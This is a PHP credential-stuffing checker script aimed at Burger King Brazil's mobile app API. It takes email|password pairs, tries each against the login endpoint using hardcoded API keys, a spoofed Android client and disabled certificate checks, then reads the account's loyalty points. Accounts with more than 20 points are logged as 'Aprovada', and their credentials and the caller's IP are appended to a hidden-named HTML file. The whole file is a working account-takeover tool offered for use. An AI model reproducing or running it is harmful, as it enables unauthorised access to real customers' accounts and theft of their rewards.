<?php
#biggsbears:D

error_reporting(0);
set_time_limit(0);
$ip = $_SERVER["REMOTE_ADDR"];

date_default_timezone_set('America/Sao_Paulo');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$loadtime = time();
function getStrc($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function deletarCookies() {
  if (file_exists("soygay.txt")) {
    unlink("soygay.txt");
  }
}


extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];
$lista = ("$email|$senha");


sleep(3);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://appbk.burgerking.com.br/v3/crm/api/customer/auth');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'appId: 123',
'api-key: 8f14ce06-22ce-4de2-8e0d-9ee3ae5dcdd7',
'x-api-key: 845ace86-9910-4761-9655-0e727d9ea914',
'Content-Type: application/json; charset=UTF-8',
'Host: appbk.burgerking.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.12.8',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"VersionBlocker":{"AppType":"android","AppVersion":"3.4.9"},"email":"'.$email.'","password":"'.$senha.'"}');
$r0 = curl_exec($ch);

$token = getStrc($r0, '"id":"','","name":"', 1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.loyalty-prd.appbk.burgerking.com.br/customer/home/'.$token.'/transactions');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'x-api-key: LrJ8T6TNqVs96fqIt0dby77eDHvVuH6kDdKPEA20',
'Host: api.loyalty-prd.appbk.burgerking.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.12.8'
));
$r1 = curl_exec($ch);

$pontos = getStrc($r1, '{"points":',',"last_credit":"', 1);

if ($pontos > 20) {
        echo 'Aprovada → '.$email.'|'.$senha.' Pontos: '.$pontos.' <br>';
        $file = fopen("liveksdkaskdkasdkasdkaskdkasdkaksdkssdsds.html", "a");
fwrite($file, "$email|$senha|$pontos| IP $ip
</br>");


}
elseif (strpos($r1, '{"message":"Membro não encontrado no programa de loyalty, realize o embarque!"}')){

echo 'Reprovada → '.$email.'|'.$senha.' Retorno: (Membro não encontrado no programa de loyalty.) <br>';
exit();
}
elseif($pontos < 10){
    echo 'Reprovada → '.$email.'|'.$senha.' Retorno: (Sem pontos bk.) <br>';
exit();

}
else{
    echo 'Reprovada → '.$email.'|'.$senha.' Retorno: (Verifique seu login e senha para entrar.) <br>';
exit();
}

#biggsbears:D
?>